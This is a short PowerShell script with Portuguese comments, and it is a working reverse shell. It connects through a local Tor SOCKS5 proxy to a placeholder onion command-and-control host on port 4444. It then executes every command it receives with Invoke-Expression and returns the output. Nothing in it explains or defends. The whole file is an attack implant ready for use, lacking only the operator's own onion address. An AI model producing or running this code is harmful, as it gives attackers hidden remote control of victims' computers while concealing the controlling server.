# ========== CONFIG ==========
$torProxy = "127.0.0.1"
$torPort = 9050
$onionHost = "seuc2.onion"  # <-- substitua aqui
$onionPort = 4444

Start-Sleep -Seconds 5

# ========== CONEXÃO VIA SOCKS5 ==========
$client = New-Object System.Net.Sockets.TcpClient
$client.Connect($torProxy, $torPort)
$stream = $client.GetStream()

$stream.Write([byte[]](0x05, 0x01, 0x00), 0, 3)
$buffer = New-Object Byte[] 2
$stream.Read($buffer, 0, 2) | Out-Null
if ($buffer[1] -ne 0x00) { $stream.Close(); exit }

$hostBytes = [System.Text.Encoding]::ASCII.GetBytes($onionHost)
$portHigh = [math]::Floor($onionPort / 256)
$portLow = $onionPort % 256
$portBytes = [byte[]]($portHigh, $portLow)
$request = [byte[]](0x05, 0x01, 0x00, 0x03, $hostBytes.Length) + $hostBytes + $portBytes
$stream.Write($request, 0, $request.Length)
$response = New-Object Byte[] 10
$stream.Read($response, 0, 10) | Out-Null
if ($response[1] -ne 0x00) { $stream.Close(); exit }

$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$writer.AutoFlush = $true

while ($true) {
    try {
        $command = $reader.ReadLine()
        if ([string]::IsNullOrEmpty($command)) { break }
        $output = Invoke-Expression $command 2>&1 | Out-String
        $output = $output.Trim() + "`nPS " + (Get-Location) + "> "
        $writer.WriteLine($output)
    } catch {
        $writer.WriteLine("Erro: $_")
    }
}
